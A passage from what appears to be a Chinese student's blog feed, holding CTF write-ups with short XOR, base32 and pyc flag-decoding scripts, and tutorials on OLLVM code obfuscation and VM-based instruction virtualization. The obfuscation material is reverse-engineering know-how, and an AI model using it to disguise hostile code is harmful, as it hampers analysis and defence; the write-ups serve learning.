class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">data:</span><br><span class="line">    c = [74, 69, 67, 79, 71, 89, 99, 113, 111, 125, 107, 81, 125, 107, 79, 82, 18, 80, 86, 22, 76, 86, 125, 22, 125, 112, 71, 84, 17, 80, 81, 17, 95, 34]</span><br><span class="line">    flag = [0, 0, ..., 0]  # 33 elements initialized to 0</span><br><span class="line">    format = &quot;plz input your flag: &quot;</span><br><span class="line">    success = &quot;Congratulations!&quot;</span><br><span class="line">    failure = &quot;Sry, plz try again&quot;</span><br><span class="line"></span><br><span class="line">text:</span><br><span class="line">    function check_flag():</span><br><span class="line">        esi = 0</span><br><span class="line">        while esi &lt; 33:</span><br><span class="line">            temp = flag[esi] XOR 0x22</span><br><span class="line">            if temp != c[esi]:</span><br><span class="line">                return false</span><br><span class="line">            esi += 1</span><br><span class="line">        return true</span><br><span class="line"></span><br><span class="line">    procedure _start():</span><br><span class="line">        # Print prompt</span><br><span class="line">        system_call(4, 1, format, 20)</span><br><span class="line"></span><br><span class="line">        # Read user input</span><br><span class="line">        system_call(3, 0, flag, 33)</span><br><span class="line"></span><br><span class="line">        # Check flag</span><br><span class="line">        if check_flag():</span><br><span class="line">            # Print success message</span><br><span class="line">            system_call(4, 1, success, 14)</span><br><span class="line">        else:</span><br><span class="line">            # Print failure message</span><br><span class="line">            system_call(4, 1, failure, 18)</span><br><span class="line"></span><br><span class="line">        # Exit</span><br><span class="line">        system_call(1, 0, 0)</span><br><span class="line"></span><br><span class="line">    function system_call(eax, ebx, ecx, edx):</span><br><span class="line">        # Simulate system call</span><br><span class="line">        # This function depends on the specific system&#x27;s calling convention</span><br><span class="line">        # and how system calls are made (e.g., int 0x80 in this case).</span><br><span class="line"></span><br><span class="line">    # Entry point</span><br><span class="line">    _start()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>写脚本出</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">xor_with_0x22</span>(<span class="params">byte_array</span>):</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> byte_array:</span><br><span class="line">       hex_value = <span class="built_in">hex</span>(byte)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">        </span><br><span class="line">       xor_result = <span class="built_in">hex</span>(byte ^ <span class="number">0x22</span>)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">        </span><br><span class="line">       result.append((hex_value, xor_result))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">byte_array = [<span class="number">74</span>, <span class="number">69</span>, <span class="number">67</span>, <span class="number">79</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">99</span>, <span class="number">113</span>, <span class="number">111</span>, <span class="number">125</span>, <span class="number">107</span>, <span class="number">81</span>, <span class="number">125</span>, <span class="number">107</span>, <span class="number">79</span>, <span class="number">82</span>, <span class="number">18</span>, <span class="number">80</span>, <span class="number">86</span>, <span class="number">22</span>, <span class="number">76</span>, <span class="number">86</span>, <span class="number">125</span>, <span class="number">22</span>, <span class="number">125</span>, <span class="number">112</span>, <span class="number">71</span>, <span class="number">84</span>, <span class="number">17</span>, <span class="number">80</span>, <span class="number">81</span>, <span class="number">17</span>, <span class="number">95</span>, <span class="number">34</span>]</span><br><span class="line"></span><br><span class="line">result = xor_with_0x22(byte_array)</span><br><span class="line"><span class="keyword">for</span> hex_value, xor_result <span class="keyword">in</span> result:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;hex_value&#125;</span> XOR 0x22 = <span class="subst">&#123;xor_result&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ezPYC"><a href="#ezPYC" class="headerlink" title="ezPYC"></a>ezPYC</h3><p>感觉是控制流平坦化后的程序。没做出来</p><p>怀疑是python deflat.py -f ezPYC.exe –addr 0x140008F41 留一下</p><p>哈哈，不是，就是普通pyc</p><p>刚学了。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="comment"># Version: Python 3.8</span></span><br><span class="line"></span><br><span class="line">flag = [</span><br><span class="line">    <span class="number">87</span>,</span><br><span class="line">    <span class="number">75</span>,</span><br><span class="line">    <span class="number">71</span>,</span><br><span class="line">    <span class="number">69</span>,</span><br><span class="line">    <span class="number">83</span>,</span><br><span class="line">    <span class="number">121</span>,</span><br><span class="line">    <span class="number">83</span>,</span><br><span class="line">    <span class="number">125</span>,</span><br><span class="line">    <span class="number">117</span>,</span><br><span class="line">    <span class="number">106</span>,</span><br><span class="line">    <span class="number">108</span>,</span><br><span class="line">    <span class="number">106</span>,</span><br><span class="line">    <span class="number">94</span>,</span><br><span class="line">    <span class="number">80</span>,</span><br><span class="line">    <span class="number">48</span>,</span><br><span class="line">    <span class="number">114</span>,</span><br><span class="line">    <span class="number">100</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">55</span>,</span><br><span class="line">    <span class="number">94</span>,</span><br><span class="line">    <span class="number">51</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">91</span>,</span><br><span class="line">    <span class="number">48</span>,</span><br><span class="line">    <span class="number">108</span>,</span><br><span class="line">    <span class="number">119</span>,</span><br><span class="line">    <span class="number">97</span>,</span><br><span class="line">    <span class="number">115</span>,</span><br><span class="line">    <span class="number">49</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">48</span>,</span><br><span class="line">    <span class="number">108</span>,</span><br><span class="line">    <span class="number">100</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">124</span>,</span><br><span class="line">    <span class="number">2</span>]</span><br><span class="line">c = [</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    <span class="number">3</span>,</span><br><span class="line">    <span class="number">4</span>]</span><br><span class="line">input_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">36</span>, <span class="number">1</span>):</span><br><span class="line">    input_str += <span class="built_in">chr</span>(c[i % <span class="number">4</span>] ^ flag[i])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(input_str)</span><br></pre></td></tr></table></figure><h1 id="BeginCTF-20240131"><a href="#BeginCTF-20240131" class="headerlink" title="BeginCTF 20240131"></a>BeginCTF 20240131</h1><h2 id="MISC-1"><a href="#MISC-1" class="headerlink" title="MISC"></a>MISC</h2><h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MJSWO2LOPNLUKTCDJ5GWKX3UN5PUEM2HNFXEGVCGL4ZDAMRUL5EDAUDFL5MU6VK7O5UUYMK7GEYWWZK7NE3X2===</span><br></pre></td></tr></table></figure><p>base32</p><h3 id="tupper"><a href="#tupper" class="headerlink" title="tupper"></a>tupper</h3><p>脚本把所有文件信息提取</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_text_from_zip</span>(<span class="params">zip_path, output_file</span>):</span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(zip_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zip_ref:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> output_txt:</span><br><span class="line">            <span class="keyword">for</span> file_info <span class="keyword">in</span> zip_ref.infolist():</span><br><span class="line">                <span class="keyword">if</span> file_info.filename.endswith(<span class="string">&#x27;.txt&#x27;</span>):</span><br><span class="line">                    <span class="keyword">with</span> zip_ref.<span class="built_in">open</span>(file_info) <span class="keyword">as</span> file:</span><br><span class="line">                        text = file.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">                        output_txt.write(text)</span><br><span class="line">                        <span class="comment">#output_txt.write(&#x27;\n\n&#x27;)  # 可以根据需要增加分隔符</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    desktop_path = os.path.join(os.path.expanduser(<span class="string">&quot;~&quot;</span>), <span class="string">&quot;Desktop&quot;</span>)  <span class="comment"># 桌面路径，根据实际情况修改</span></span><br><span class="line">    zip_file_path = os.path.join(desktop_path, <span class="string">&quot;tupper.zip&quot;</span>)  <span class="comment"># 压缩包路径，根据实际情况修改</span></span><br><span class="line">    output_file_path = os.path.join(desktop_path, <span class="string">&quot;output.txt&quot;</span>)  <span class="comment"># 输出文件路径，根据实际情况修改</span></span><br><span class="line"></span><br><span class="line">    extract_text_from_zip(zip_file_path, output_file_path)</span><br></pre></td></tr></table></figure><p>看题目是tupper，说不定是个加密方式，一搜，哈真是</p><p><a href="http://t.csdnimg.cn/OF1OP">代码急转弯——Tupper（塔珀自指公式）</a></p><p><a href="https://tuppers-formula.ovh/">https://tuppers-formula.ovh/</a></p><p>上面output.txt内容–&gt;bese64–&gt;k–&gt;flag</p><h3 id="where-is-crazyman-v1-0"><a href="#where-is-crazyman-v1-0" class="headerlink" title="where is crazyman v1.0"></a>where is crazyman v1.0</h3><p>google识图</p><h3 id="devil’s-word"><a href="#devil’s-word" class="headerlink" title="devil’s word"></a>devil’s word</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">leu lia leu ng leu cai leu jau leu e cai b cai jau sa leng cai ng ng f leu b leu e sa leng cai cai ng f cai cai sa sa leu e cai a leu bo leu f cai ng ng f leu sii leu jau sa sii leu c leu ng leu sa cai sii cai d</span><br></pre></td></tr></table></figure><p>我的解密：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">leu lia 62 </span><br><span class="line">leu ng 65</span><br><span class="line">leu cai 67</span><br><span class="line">leu jau 69</span><br><span class="line">leu e 61</span><br><span class="line">cai b 78</span><br><span class="line">cai jau 79</span><br><span class="line">sa leng 32</span><br><span class="line">cai ng 75</span><br><span class="line">ng f 58</span><br><span class="line">leu b 68</span><br><span class="line">leu e 65</span><br><span class="line">sa leng 32</span><br><span class="line">cai cai 77</span><br><span class="line">ng f 58</span><br><span class="line">cai cai 77</span><br><span class="line">sa sa 33</span><br><span class="line">leu e 61</span><br><span class="line">cai a 71</span><br><span class="line">leu bo 68</span><br><span class="line">leu f 68</span><br><span class="line">cai ng 75</span><br><span class="line">ng f 58</span><br><span class="line">leu sii 64</span><br><span class="line">leu jau 69</span><br><span class="line">sa sii 34</span><br><span class="line">leu c 67</span><br><span class="line">leu ng 65</span><br><span class="line">leu sa 63</span><br><span class="line">cai sii 74</span><br><span class="line">cai d 76</span><br></pre></td></tr></table></figure><h2 id="RE-1"><a href="#RE-1" class="headerlink" title="RE"></a>RE</h2><h3 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h3><p>agh{^bvuwTooahlYocPtmyiijj|ek</p><p>63290794207715587679621386735000</p><p>反调试</p><h3 id="real-checkin-xor"><a href="#real-checkin-xor" class="headerlink" title="real checkin xor"></a>real checkin xor</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def decrypt_func(encrypted, key):</span><br><span class="line">    decrypted = []</span><br><span class="line">    for i in range(len(encrypted)):</span><br><span class="line">        decrypted.append(chr(encrypted[i] ^ ord(key[i % len(key)])))</span><br><span class="line">    return &#x27;&#x27;.join(decrypted)</span><br><span class="line"></span><br><span class="line">key = &quot;ez_python_xor_reverse&quot;</span><br><span class="line">ciper = [7, 31, 56, 25, 23, 15, 91, 21, 49, 15, 33, 88, 26, 48, 60, 58, 4, 86, 36, 64, 23, 54, 63, 0, 54, 22, 6, 55, 59, 38, 108, 39, 45, 23, 102, 27, 11, 56, 32, 0, 82, 24]</span><br><span class="line"></span><br><span class="line">decrypted_text = decrypt_func(ciper, key)</span><br><span class="line">print(&quot;解密后的文本:&quot;, decrypted_text)</span><br></pre></td></tr></table></figure><h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="逆向工程-reverse-入门指南"><a href="#逆向工程-reverse-入门指南" class="headerlink" title="逆向工程(reverse)入门指南"></a>逆向工程(reverse)入门指南</h3><p>pdf隐写</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;HGAME-20240129&quot;&gt;&lt;a href=&quot;#HGAME-20240129&quot; class=&quot;headerlink&quot; title=&quot;HGAME 20240129&quot;&gt;&lt;/a&gt;HGAME 20240129&lt;/h1&gt;&lt;h2 id=&quot;MISC&quot;&gt;&lt;a href=&quot;#M</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>OLLVM</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/01/24/ollvm!/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/01/24/ollvm!/</id>
    <published>2024-01-23T16:00:00.000Z</published>
    <updated>2024-02-02T12:15:29.348Z</updated>
    
    <content type="html"><![CDATA[<h1 id="OLLVM"><a href="#OLLVM" class="headerlink" title="OLLVM"></a>OLLVM</h1><p>LLVM 是一个<strong>开源的编译器架构</strong>，利用虚拟技术对源代码提供现代化的、与目标无关的、针对多种 CPU的，代码优化和代码生成功能。</p><p>LLVM 核心库提供了与编译器相关的支持，可以作为多种语言编译器的后台来使用，能够进行程序语言的编译期优化、链接优化、在线编译优化、代码生成。</p><p>LLVM 三段式架构：</p><ul><li><p>前端：解析源代码，由语法分析器和语义分析协同工作，检查语法错误，并构建语言的抽象语法树来表示输入代码， 然后将分析好的代码转化为 LLVM 的中间表示 IR (IntermediateRepresentation) 。</p></li><li><p>优化器：通过一系列的 Pass 对中间代码 IR 进行优化， 改善代码的运行时间使代码更高效。</p></li><li><p>后端：负责将优化器优化后的中间代码 IR 转换为目标机器的代码</p></li></ul><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240124130149036.png" alt="image-20240124130149036"></p><p><strong>OLLVM(Obfuscator-LLVM)</strong> 是瑞士西部应用科学大学安全小组于 2010 年 6 月发起的一个项目。该项目的目的是提供一套开源的<strong>基于****LLVM</strong>的代码混淆工具，通过代码混淆和防篡改提供更高的软件安全</p><p>性。</p><p>OLLVM 工作在 LLVM IR 中间表示层，通过<strong>编写<strong><strong>Pass</strong></strong>来混淆****IR</strong>， 后端依照 IR 转换的目标机器的代码也就达到了混淆的目的。</p><p>OLLVM 提供了三种混淆模式：</p><ul><li><p>指令替换 (Instructions Substitution)</p></li><li><p>虚假控制流 (BogusControl Flow)</p></li><li><p>控制流平坦化 (Control Flow Flattening)</p></li></ul><h2 id="正向使用"><a href="#正向使用" class="headerlink" title="正向使用"></a><strong>正向使用</strong></h2><h4 id="编译-ollvm"><a href="#编译-ollvm" class="headerlink" title="编译 ollvm"></a><strong>编译</strong> <strong>ollvm</strong></h4><p>编译环境为 ubuntu 20.04，先下载 ollvm 源码：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone -b llvm-<span class="number">4</span>.<span class="number">0</span> https://github.com/obfuscator-llvm/obfuscator.git</span><br></pre></td></tr></table></figure><p>然后修改 <code>obfuscator/include/llvm/ExecutionEngine/Orc/OrcRemoteTargetClient.h</code> 文件第690 行，将 <code>Expected&lt;std::vector&lt;uint8_t&gt;&gt;</code> 改为<code>Expected&lt;std::vector&lt;unsigned char&gt;&gt;</code></p><p>接着降低 gcc 版本，执行如下命令：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gcc-<span class="number">8</span> g++-<span class="number">8</span> -y</span><br><span class="line">sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-<span class="number">8</span> <span class="number">8</span></span><br><span class="line">sudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-<span class="number">8</span> <span class="number">8</span></span><br><span class="line">sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-<span class="number">9</span> <span class="number">9</span></span><br><span class="line">sudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-<span class="number">9</span> <span class="number">9</span></span><br></pre></td></tr></table></figure><p>切换 gcc 与 g++ 的默认版本</p><p>sudo update-alternatives –config gcc</p><p>sudo update-alternatives –config g++</p><p>在 obfuscator 目录下执行如下命令，开始编译：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> build</span><br><span class="line"><span class="built_in">cd</span> build</span><br><span class="line">cmake -DCMAKE_BUILD_TYPE=Release -DLLVM_INCLUDE_TESTS=OFF ../</span><br><span class="line">make -j7</span><br></pre></td></tr></table></figure><p>编译完成后，在 obfuscator&#x2F;build&#x2F;bin 目录下会产生很多可执行文件，将这个路径添加到环境变量即可。</p><h3 id="使用-ollvm"><a href="#使用-ollvm" class="headerlink" title="使用 ollvm"></a><strong>使用</strong> <strong>ollvm</strong></h3><h4 id="指令替换"><a href="#指令替换" class="headerlink" title="指令替换"></a><strong>指令替换</strong></h4><p>通过功能上等价的但更复杂的指令序列， 替换标准二元运算符（如加法、 减法或布尔运算符）， 当有</p><p>多个可用的等效指令序列时， 随机选择一个。</p><p>编译选项：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-mllvm -sub: 激活指令替代</span><br><span class="line">-mllvm -sub_loop=<span class="number">3</span>: 混淆次数，一个函数会被混淆<span class="number">3</span>次，默认为<span class="number">1</span>次</span><br></pre></td></tr></table></figure><p>混淆前后对比</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240124130430375.png" alt="image-20240124130430375"></p><h5 id="指令转换："><a href="#指令转换：" class="headerlink" title="指令转换："></a>指令转换：</h5><p>Addition</p><ul><li><p><code>a = b - (-c)</code></p></li><li><pre><code>r = rand (); a = b - r; a = a + b; a = a + r<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  r = rand (); a = b + r; a = a + c; a = a - r</span><br></pre></td></tr></table></figure></code></pre></li><li><pre><code>a = -(-b + (-c))<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Subtraction</span><br><span class="line"></span><br><span class="line">- `a = b + (-c)`</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  r = rand (); a = b - r; a = a - c; a = a + r</span><br></pre></td></tr></table></figure></code></pre></li><li><pre><code>r = rand (); a = b + r; a = a - c; a = a - r</code></pre></li></ul><p>AND</p><ul><li><code>a = b &amp; c</code> &#x3D;&gt; <code>a = (b ^ ~c) &amp; b</code></li></ul><p>OR</p><ul><li><code>a = b | c</code> &#x3D;&gt; <code>a = (b &amp; c) | (b ^ c)</code></li></ul><p>XOR</p><ul><li><code>a = a ^ b</code> &#x3D;&gt; <code>a = (~a &amp; b) | (a &amp; ~b)</code></li></ul><h4 id="虚假控制流"><a href="#虚假控制流" class="headerlink" title="虚假控制流"></a><strong>虚假控制流</strong></h4><p>通过在当前基本块之前添加基本块来修改程序的控制流图，原始的基本块也会被克隆，并插入随机的垃圾指令。</p><p>编译选项：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-mllvm -bcf: 激活虚假控制流</span><br><span class="line">-mllvm -bcf_loop=<span class="number">3</span>: 混淆次数，一个函数会被混淆<span class="number">3</span>次，默认为<span class="number">1</span></span><br><span class="line">-mllvm -bcf_prob=<span class="number">40</span>: 每个基本块被混淆的概率，当前每个基本块被混淆的概率为<span class="number">40</span><span class="variable">%，默认为30%</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240124130457258.png" alt="image-20240124130457258"></p><h4 id="控制流平坦化"><a href="#控制流平坦化" class="headerlink" title="控制流平坦化"></a><strong>控制流平坦化</strong></h4><p>消除正常程序控制流中基本块的相互关联，使用一个集中的主分发块来调度基本块的执行顺序，得到一</p><p>个循环嵌套Switch的执行逻辑。</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240124130521676.png" alt="image-20240124130521676"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240124130535132.png" alt="image-20240124130535132"></p><p>序言：函数的第一个执行的基本块主(子)分发器：控制程序跳转到下一个待执行的基本块</p><p>retn块：函数出口</p><p>真实块：混淆前的基本块，程序真正执行工作的版块</p><p>预处理器：跳转到主分发器</p><p>编译选项：</p><p><a href="https://github.com/obfuscator-llvm/obfuscator/wiki/Control-Flow-Flattening">https://github.com/obfuscator-llvm/obfuscator/wiki/Control-Flow-Flattening</a></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-mllvm -fla: 激活控制流平坦化</span><br><span class="line">-mllvm -split: 激活基本块分割</span><br><span class="line">-mllvm -split_num=<span class="number">3</span>: 指定基本块分割的数目</span><br></pre></td></tr></table></figure><p><a href="http://t.csdnimg.cn/FaGnP">angr安装</a></p><p>关于angr的一些题目：<a href="https://www.cnblogs.com/level5uiharu/p/16925991.html">https://www.cnblogs.com/level5uiharu/p/16925991.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;OLLVM&quot;&gt;&lt;a href=&quot;#OLLVM&quot; class=&quot;headerlink&quot; title=&quot;OLLVM&quot;&gt;&lt;/a&gt;OLLVM&lt;/h1&gt;&lt;p&gt;LLVM 是一个&lt;strong&gt;开源的编译器架构&lt;/strong&gt;，利用虚拟技术对源代码提供现代化的、与目标无关的、</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>指令虚拟化</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/01/23/%E6%8C%87%E4%BB%A4%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/01/23/%E6%8C%87%E4%BB%A4%E8%99%9A%E6%8B%9F%E5%8C%96/</id>
    <published>2024-01-22T16:00:00.000Z</published>
    <updated>2024-02-02T12:18:45.636Z</updated>
    
    <content type="html"><![CDATA[<h1 id="指令虚拟化"><a href="#指令虚拟化" class="headerlink" title="指令虚拟化"></a>指令虚拟化</h1><p>虚拟机（VM）其实就是用软件来模拟硬件。我们可以仿照 x86 指令集，自己定义一套指令，在程序（解释器）中有一套函数和结构来解析自定义的指令并执行相应的功能。</p><p>虚拟化是一种基于虚拟机的代码保护技术。他将硬件支持的机器码转化为字节码指令系统，来达到不被轻易篡改和逆向的目的。</p><p>简单来说就是出题人通过实现一个小型的虚拟机，自定义一些操作码（opcode），然后在程序执行时通过解释操作码，执行对应的函数，从而实现程序原有的功能。</p><p>下图是常见的虚拟机结构：</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240123191130428.png" alt="image-20240123191130428"></p><p>虚拟机的主程序其实就是一个循环，这个循环不断的去读取指令（伪机器码 opcode），然后执行指令opcode 所对应的一些函数，这样下来就可以与真实的程序执行相差无几。</p><h2 id="正向实现"><a href="#正向实现" class="headerlink" title="正向实现"></a><strong>正向实现</strong></h2><p>想要对抗虚拟化，首先要搞清楚用于保护的虚拟机是如何实现的要想实现虚拟机，需要完成两个目标：</p><ol><li><p>定义一套指令集</p></li><li><p>实现对应的解释器</p></li></ol><h3 id="结构体定义"><a href="#结构体定义" class="headerlink" title="结构体定义"></a><strong>结构体定义</strong></h3><p>真实赛题中的 VM 通常会实现一个类似如下的结构体，用于保存虚拟机状态：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> r1; <span class="comment">// 虚拟寄存器 r1</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> r2; <span class="comment">// 虚拟寄存器 r2</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> eip; <span class="comment">// 指向正在解释的 opcode 地址</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> mem[<span class="number">256</span>]; <span class="comment">// 虚拟内存</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> code[<span class="number">1024</span>]; <span class="comment">// 存放自定义机器码</span></span><br><span class="line">&#125; VM;</span><br></pre></td></tr></table></figure><h3 id="opcode-定义"><a href="#opcode-定义" class="headerlink" title="opcode 定义"></a><strong>opcode</strong> <strong>定义</strong></h3><p>接着自定义一些指令，需要决定该指令集是<strong>定长</strong>的还是<strong>变长</strong>的。</p><p>这里以变长指令集为例，先列出一个表来：</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240123194824707.png" alt="image-20240123194824707"></p><h3 